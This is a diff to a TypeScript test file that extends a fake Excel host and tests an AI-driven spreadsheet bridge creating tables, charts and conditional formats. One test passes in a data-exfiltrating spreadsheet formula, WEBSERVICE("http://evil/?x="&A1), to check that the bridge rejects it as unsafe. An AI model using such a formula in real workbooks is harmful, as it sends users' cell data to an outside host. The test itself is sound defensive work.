@@ -41,6 +41,29 @@ interface CommentSeed {
   replies: string[];
   resolved: boolean;
 }
+/** A native Table the bridge minted via `tables.add`, keyed on the host-minted name. */
+interface TableSeed {
+  name: string;
+  sheet: string;
+  address: string;
+  hasHeaders: boolean;
+}
+/** A chart the bridge minted via `charts.add`, keyed on the host-minted name. */
+interface ChartSeed {
+  name: string;
+  sheet: string;
+  chartType: string;
+  seriesBy: string;
+  sourceAddress: string;
+  title?: string;
+}
+/** One conditional-format rule appended to a range's CF collection. */
+interface CfSeed {
+  address: string;
+  cfType: string;
+  cellValue?: { operator: string; formula1: string; formula2?: string; fill?: string };
+  top?: { rank: number; type: string; fill?: string };
+}
 interface ExcelSeed {
   sheets: SheetSeed[];
   activeSheet: string;
@@ -48,6 +71,15 @@ interface ExcelSeed {
   namedRanges: NamedRangeSeed[];
   comments: CommentSeed[];
   formats: Map<string, Record<string, unknown>>;
+  /** Tables minted via `tables.add`, in mint order (the minted name is the inverse identity). */
+  tables: TableSeed[];
+  /** Charts minted via `charts.add`, in mint order. */
+  charts: ChartSeed[];
+  /** Conditional-format rules per range address (ordinal = index within the array). */
+  conditionalFormats: Map<string, CfSeed[]>;
+  /** Monotonic counters so each mint gets a deterministic host-assigned name. */
+  tableCounter: number;
+  chartCounter: number;
 }
 
 function seedOf(init: Partial<ExcelSeed> & { sheets: SheetSeed[] }): ExcelSeed {
@@ -61,6 +93,11 @@ function seedOf(init: Partial<ExcelSeed> & { sheets: SheetSeed[] }): ExcelSeed {
     namedRanges: init.namedRanges ?? [],
     comments: init.comments ?? [],
     formats: init.formats ?? new Map(),
+    tables: init.tables ?? [],
+    charts: init.charts ?? [],
+    conditionalFormats: init.conditionalFormats ?? new Map(),
+    tableCounter: init.tableCounter ?? 0,
+    chartCounter: init.chartCounter ?? 0,
   };
 }
 
@@ -131,6 +168,8 @@ class FakeRange {
     private readonly sheetName: string,
     private readonly a1: string,
     private readonly nullObject = false,
+    /** When true, `load()` marks props loaded immediately — for ranges the context doesn't track. */
+    private readonly autoFlush = false,
   ) {}
 
   private require(prop: string): void {
@@ -182,6 +221,7 @@ class FakeRange {
       const name = raw.trim().split('/')[0]?.trim();
       if (name) this.requested.add(name);
     }
+    if (this.autoFlush) this.flushLoads();
     return this;
   }
   flushLoads(): void {
@@ -192,6 +232,9 @@ class FakeRange {
     const span = parseA1(this.a1);
     const a1 = `${indexToCol(span.startCol + colOffset)}${span.startRow + rowOffset + 1}`;
     return new FakeRange(this.seed, this.sheetName, a1);
+  }
+  get conditionalFormats(): FakeConditionalFormatCollection {
+    return new FakeConditionalFormatCollection(this.seed, `${this.sheetName}!${this.a1}`);
   }
   commit(): void {
     if (this.nullObject) return;
@@ -235,6 +278,187 @@ class FakeRange {
   }
 }
 
+/* ─────────────────── fake tables / charts / conditional ─────────────────── */
+
+/** Models the slice of `Excel.Table` the bridge loads: a host-MINTED `name` + `getRange`. */
+class FakeTable {
+  constructor(
+    private readonly seed: ExcelSeed,
+    private readonly target: TableSeed,
+  ) {}
+  private loaded = false;
+  load(props?: string): this {
+    if (!props || props.includes('name')) this.loaded = true;
+    return this;
+  }
+  get name(): string {
+    if (!this.loaded) throw new Error('fake-excel: table "name" not loaded before sync');
+    return this.target.name;
+  }
+  getRange(): FakeRange {
+    // Not registered with the context's range tracker → auto-flush so the bridge can read
+    // `getRange().address` after its sync (mirrors how Office resolves a derived range).
+    return new FakeRange(
+      this.seed,
+      this.target.sheet,
+      this.target.address.replace(/\$/g, ''),
+      false,
+      true,
+    );
+  }
+}
+
+class FakeTableCollection {
+  constructor(
+    private readonly seed: ExcelSeed,
+    private readonly sheetName: string,
+  ) {}
+  added: Array<{ address: string; hasHeaders: boolean }> = [];
+  add(address: string, hasHeaders: boolean): FakeTable {
+    this.added.push({ address, hasHeaders });
+    // The host assigns the name — NOT the caller. Mirror that: a deterministic minted name the
+    // bridge must read back. (`Table1`, `Table2`, …)
+    const name = `Table${++this.seed.tableCounter}`;
+    const bang = address.lastIndexOf('!');
+    const sheet = bang >= 0 ? address.slice(0, bang) : this.sheetName;
+    const a1 = bang >= 0 ? address.slice(bang + 1) : address;
+    const target: TableSeed = { name, sheet, address: a1, hasHeaders };
+    this.seed.tables.push(target);
+    return new FakeTable(this.seed, target);
+  }
+}
+
+class FakeChartTitle {
+  constructor(private readonly target: ChartSeed) {}
+  set text(v: string) {
+    this.target.title = v;
+  }
+}
+class FakeChart {
+  constructor(private readonly target: ChartSeed) {}
+  private loaded = false;
+  get title(): FakeChartTitle {
+    return new FakeChartTitle(this.target);
+  }
+  load(props?: string): this {
+    if (!props || props.includes('name')) this.loaded = true;
+    return this;
+  }
+  get name(): string {
+    if (!this.loaded) throw new Error('fake-excel: chart "name" not loaded before sync');
+    return this.target.name;
+  }
+}
+
+class FakeChartCollection {
+  constructor(
+    private readonly seed: ExcelSeed,
+    private readonly sheetName: string,
+  ) {}
+  added: Array<{ chartType: string; sourceAddress: string; seriesBy: string }> = [];
+  add(chartType: string, sourceData: FakeRange, seriesBy: string): FakeChart {
+    sourceData.load('address');
+    sourceData.flushLoads();
+    const sourceAddress = sourceData.address;
+    this.added.push({ chartType, sourceAddress, seriesBy });
+    const name = `Chart ${++this.seed.chartCounter}`;
+    const target: ChartSeed = { name, sheet: this.sheetName, chartType, seriesBy, sourceAddress };
+    this.seed.charts.push(target);
+    return new FakeChart(target);
+  }
+}
+
+/** Minimal `ClientResult<number>` — `.value` resolves after sync (snapshotted at call time here). */
+class FakeClientResult {
+  constructor(readonly value: number) {}
+}
+
+class FakeConditionalRangeFill {
+  constructor(private readonly onColor: (c: string) => void) {}
+  private _color = '';
+  get color(): string {
+    return this._color;
+  }
+  set color(v: string) {
+    this._color = v;
+    this.onColor(v);
+  }
+}
+class FakeConditionalRangeFormat {
+  constructor(private readonly onFill: (c: string) => void) {}
+  get fill(): FakeConditionalRangeFill {
+    return new FakeConditionalRangeFill(this.onFill);
+  }
+}
+class FakeCellValueConditionalFormat {
+  constructor(private readonly seed: CfSeed) {}
+  set rule(r: { formula1: string; formula2?: string; operator: string }) {
+    this.seed.cellValue = {
+      operator: r.operator,
+      formula1: r.formula1,
+      ...(r.formula2 !== undefined ? { formula2: r.formula2 } : {}),
+      ...(this.seed.cellValue?.fill !== undefined ? { fill: this.seed.cellValue.fill } : {}),
+    };
+  }
+  get format(): FakeConditionalRangeFormat {
+    return new FakeConditionalRangeFormat((color) => {
+      this.seed.cellValue = {
+        operator: '',
+        formula1: '',
+        ...(this.seed.cellValue ?? {}),
+        fill: color,
+      };
+    });
+  }
+}
+class FakeTopBottomConditionalFormat {
+  constructor(private readonly seed: CfSeed) {}
+  set rule(r: { rank: number; type: string }) {
+    this.seed.top = {
+      rank: r.rank,
+      type: r.type,
+      ...(this.seed.top?.fill !== undefined ? { fill: this.seed.top.fill } : {}),
+    };
+  }
+  get format(): FakeConditionalRangeFormat {
+    return new FakeConditionalRangeFormat((color) => {
+      this.seed.top = { rank: 0, type: '', ...(this.seed.top ?? {}), fill: color };
+    });
+  }
+}
+class FakeConditionalFormat {
+  constructor(private readonly seed: CfSeed) {}
+  get cellValue(): FakeCellValueConditionalFormat {
+    return new FakeCellValueConditionalFormat(this.seed);
+  }
+  get topBottom(): FakeTopBottomConditionalFormat {
+    return new FakeTopBottomConditionalFormat(this.seed);
+  }
+}
+
+class FakeConditionalFormatCollection {
+  constructor(
+    private readonly seed: ExcelSeed,
+    private readonly address: string,
+  ) {}
+  private list(): CfSeed[] {
+    let arr = this.seed.conditionalFormats.get(this.address);
+    if (!arr) {
+      arr = [];
+      this.seed.conditionalFormats.set(this.address, arr);
+    }
+    return arr;
+  }
+  getCount(): FakeClientResult {
+    return new FakeClientResult(this.list().length);
+  }
+  add(type: string): FakeConditionalFormat {
+    const rule: CfSeed = { address: this.address, cfType: type };
+    this.list().push(rule);
+    return new FakeConditionalFormat(rule);
+  }
+}
+
 class FakeNamedItem {
   constructor(
     private readonly seed: ExcelSeed,
@@ -263,6 +487,12 @@ class FakeWorksheet {
   ) {}
   load(): this {
     return this;
+  }
+  get tables(): FakeTableCollection {
+    return new FakeTableCollection(this.seed, this.name);
+  }
+  get charts(): FakeChartCollection {
+    return new FakeChartCollection(this.seed, this.name);
   }
   getUsedRange(): FakeRange {
     const sheet = byName(this.seed, this.name);
@@ -576,6 +806,15 @@ function writeCells(params: ActuationRequest['params'], id = 'c1'): ActuationReq
 }
 function formatCells(params: ActuationRequest['params'], id = 'c1'): ActuationRequest {
   return { changeId: asChangeId(id), kind: 'format-cells', surface: 'excel', params };
+}
+function createTable(params: ActuationRequest['params'], id = 'c1'): ActuationRequest {
+  return { changeId: asChangeId(id), kind: 'create-table', surface: 'excel', params };
+}
+function insertChart(params: ActuationRequest['params'], id = 'c1'): ActuationRequest {
+  return { changeId: asChangeId(id), kind: 'insert-chart', surface: 'excel', params };
+}
+function formatConditional(params: ActuationRequest['params'], id = 'c1'): ActuationRequest {
+  return { changeId: asChangeId(id), kind: 'format-conditional', surface: 'excel', params };
 }
 function addComment(params: ActuationRequest['params'], id = 'c1'): ActuationRequest {
   return { changeId: asChangeId(id), kind: 'add-comment', surface: 'excel', params };
@@ -973,6 +1212,233 @@ describe('ExcelBridge.actuate format-cells', () => {
     active = installExcel(salesSeed());
     const res = await new ExcelBridge().actuate(formatCells({ target: { range: 'Sales!A1' } }));
     expect(res).toMatchObject({ ok: false, error: { code: 'no_format' } });
+  });
+});
+
+describe('ExcelBridge.actuate create-table (ADR-0007 table verb)', () => {
+  it('promotes the range to a native table and records the MINTED name as the inverse identity', async () => {
+    active = installExcel(salesSeed());
+    const res = await new ExcelBridge().actuate(
+      createTable(
+        { table: { range: 'Sales!A1:C4', hasHeaders: true, name: 'ModelChosen' } },
+        'chg-t',
+      ),
+    );
+    expect(res).toMatchObject({ ok: true, changeId: asChangeId('chg-t'), location: 'Sales!A1:C4' });
+    // `tables.add` was called with the right address + hasHeaders.
+    const minted = active.seed.tables;
+    expect(minted).toHaveLength(1);
+    expect(minted[0]).toMatchObject({ sheet: 'Sales', address: 'A1:C4', hasHeaders: true });
+    // The inverse deletes the host-MINTED name (Table1), NOT the model-chosen "ModelChosen".
+    expect(res.inverse).toEqual({ op: 'delete-object', objectType: 'table', name: 'Table1' });
+    expect(res.inverse).not.toMatchObject({ name: 'ModelChosen' });
+  });
+
+  it('defaults hasHeaders to true when omitted by the model', async () => {
+    active = installExcel(salesSeed());
+    // Model omits hasHeaders (the schema defaults it to true at the gateway boundary). The bridge's
+    // pure plan applies the same default, so the host write still promotes with headers.
+    await new ExcelBridge().actuate(createTable({ table: { range: 'Sales!A1:C4' } as never }));
+    expect(active.seed.tables[0]?.hasHeaders).toBe(true);
+  });
+
+  it('fails closed (no_anchor) when params.table is absent — no host touch', async () => {
+    active = installExcel(salesSeed());
+    const res = await new ExcelBridge().actuate(createTable({}));
+    expect(res).toMatchObject({ ok: false, error: { code: 'no_anchor' } });
+    expect(active.seed.tables).toHaveLength(0);
+  });
+
+  it('persists durable provenance for the table write', async () => {
+    active = installExcel(salesSeed());
+    const res = await new ExcelBridge().actuate({
+      ...createTable({ table: { range: 'Sales!A1:C4', hasHeaders: true } }, 'chg-tp'),
+      provenance: PROVENANCE,
+    });
+    expect(res.ok).toBe(true);
+    expect(active.settings.store.has('ge:prov:chg-tp')).toBe(true);
+  });
+});
+
+describe('ExcelBridge.actuate insert-chart (ADR-0007 chart verb)', () => {
+  it('adds a chart with the mapped type/seriesBy and records the MINTED chart name as inverse', async () => {
+    active = installExcel(salesSeed());
+    const res = await new ExcelBridge().actuate(
+      insertChart(
+        {
+          chart: {
+            chartType: 'column',
+            sourceRange: 'Sales!A1:C4',
+            seriesBy: 'columns',
+            title: 'Revenue',
+          },
+        },
+        'chg-ch',
+      ),
+    );
+    expect(res.ok).toBe(true);
+    const charts = active.seed.charts;
+    expect(charts).toHaveLength(1);
+    // agent enums mapped: column → ColumnClustered, columns → Columns.
+    expect(charts[0]).toMatchObject({
+      chartType: 'ColumnClustered',
+      seriesBy: 'Columns',
+      sourceAddress: 'Sales!A1:C4',
+      title: 'Revenue',
+    });
+    // The inverse deletes the host-MINTED chart name.
+    expect(res.inverse).toEqual({ op: 'delete-object', objectType: 'chart', name: 'Chart 1' });
+    expect(res.location).toBe('Chart 1');
+  });
+
+  it('maps each agent chart type to its Excel.ChartType', async () => {
+    const cases: Array<[string, string]> = [
+      ['bar', 'BarClustered'],
+      ['line', 'Line'],
+      ['pie', 'Pie'],
+      ['scatter', 'XYScatter'],
+      ['area', 'Area'],
+    ];
+    for (const [agent, host] of cases) {
+      active?.restore();
+      active = installExcel(salesSeed());
+      await new ExcelBridge().actuate(
+        insertChart({
+          chart: { chartType: agent as 'bar', sourceRange: 'Sales!A1:C4', seriesBy: 'auto' },
+        }),
+      );
+      expect(active.seed.charts[0]?.chartType).toBe(host);
+      expect(active.seed.charts[0]?.seriesBy).toBe('Auto');
+    }
+  });
+
+  it('fails closed (no_anchor) when params.chart is absent — no host touch', async () => {
+    active = installExcel(salesSeed());
+    const res = await new ExcelBridge().actuate(insertChart({}));
+    expect(res).toMatchObject({ ok: false, error: { code: 'no_anchor' } });
+    expect(active.seed.charts).toHaveLength(0);
+  });
+});
+
+describe('ExcelBridge.actuate format-conditional (ADR-0007 cf verb)', () => {
+  it('adds a cellValue rule with the mapped operator + fill and records the rule ordinal inverse', async () => {
+    active = installExcel(salesSeed());
+    const res = await new ExcelBridge().actuate(
+      formatConditional(
+        {
+          conditional: {
+            range: 'Sales!C2:C4',
+            rule: { kind: 'cellValue', operator: 'gt', value: '200', fill: '#C6EFCE' },
+          },
+        },
+        'chg-cf',
+      ),
+    );
+    expect(res).toMatchObject({ ok: true, location: 'Sales!C2:C4' });
+    const rules = active.seed.conditionalFormats.get('Sales!C2:C4');
+    expect(rules).toHaveLength(1);
+    expect(rules?.[0]).toMatchObject({
+      cfType: 'CellValue',
+      cellValue: { operator: 'GreaterThan', formula1: '200', fill: '#C6EFCE' },
+    });
+    // The first rule added to an empty CF collection has ordinal 0.
+    expect(res.inverse).toEqual({
+      op: 'clear-conditional',
+      range: 'Sales!C2:C4',
+      ruleOrdinal: 0,
+    });
+  });
+
+  it('carries formula2 for a between rule', async () => {
+    active = installExcel(salesSeed());
+    await new ExcelBridge().actuate(
+      formatConditional({
+        conditional: {
+          range: 'Sales!C2:C4',
+          rule: { kind: 'cellValue', operator: 'between', value: '100', value2: '300' },
+        },
+      }),
+    );
+    expect(active.seed.conditionalFormats.get('Sales!C2:C4')?.[0]?.cellValue).toMatchObject({
+      operator: 'Between',
+      formula1: '100',
+      formula2: '300',
+    });
+  });
+
+  it('adds a top rule with the BottomItems criterion and the rank', async () => {
+    active = installExcel(salesSeed());
+    const res = await new ExcelBridge().actuate(
+      formatConditional({
+        conditional: {
+          range: 'Sales!C2:C4',
+          rule: { kind: 'top', rank: 2, bottom: true, fill: '#FFC7CE' },
+        },
+      }),
+    );
+    expect(res.ok).toBe(true);
+    expect(active.seed.conditionalFormats.get('Sales!C2:C4')?.[0]).toMatchObject({
+      cfType: 'TopBottom',
+      top: { rank: 2, type: 'BottomItems', fill: '#FFC7CE' },
+    });
+  });
+
+  it('adds a bare dataBar rule', async () => {
+    active = installExcel(salesSeed());
+    const res = await new ExcelBridge().actuate(
+      formatConditional({ conditional: { range: 'Sales!C2:C4', rule: { kind: 'dataBar' } } }),
+    );
+    expect(res.ok).toBe(true);
+    expect(active.seed.conditionalFormats.get('Sales!C2:C4')?.[0]?.cfType).toBe('DataBar');
+  });
+
+  it('records an incrementing ordinal when a second rule is added to the same range', async () => {
+    active = installExcel(salesSeed());
+    const bridge = new ExcelBridge();
+    await bridge.actuate(
+      formatConditional(
+        { conditional: { range: 'Sales!C2:C4', rule: { kind: 'dataBar' } } },
+        'cf1',
+      ),
+    );
+    const res2 = await bridge.actuate(
+      formatConditional(
+        { conditional: { range: 'Sales!C2:C4', rule: { kind: 'colorScale' } } },
+        'cf2',
+      ),
+    );
+    // The second rule's inverse ordinal is 1 (it sits at index 1 in the range's CF collection).
+    expect(res2.inverse).toMatchObject({ op: 'clear-conditional', ruleOrdinal: 1 });
+  });
+
+  it('fails closed (no_anchor) when params.conditional is absent — no host touch', async () => {
+    active = installExcel(salesSeed());
+    const res = await new ExcelBridge().actuate(formatConditional({}));
+    expect(res).toMatchObject({ ok: false, error: { code: 'no_anchor' } });
+    expect(active.seed.conditionalFormats.size).toBe(0);
+  });
+
+  it('degrades (unsupported_host) on a host below ExcelApi 1.6 without touching the host', async () => {
+    active = installExcel(salesSeed(), { apiVersion: 4 });
+    const res = await new ExcelBridge().actuate(
+      formatConditional({ conditional: { range: 'Sales!C2:C4', rule: { kind: 'dataBar' } } }),
+    );
+    expect(res).toMatchObject({ ok: false, degraded: true, error: { code: 'unsupported_host' } });
+    expect(active.seed.conditionalFormats.size).toBe(0);
+  });
+
+  it('degrades (unsafe_formula) when a cellValue threshold is untrusted active content — no host touch', async () => {
+    active = installExcel(salesSeed());
+    const res = await new ExcelBridge().actuate(
+      formatConditional({
+        conditional: {
+          range: 'Sales!C2:C4',
+          rule: { kind: 'cellValue', operator: 'gt', value: 'WEBSERVICE("http://evil/?x="&A1)' },
+        },
+      }),
+    );
+    expect(res).toMatchObject({ ok: false, degraded: true, error: { code: 'unsafe_formula' } });
+    expect(active.seed.conditionalFormats.size).toBe(0);
   });
 });
 
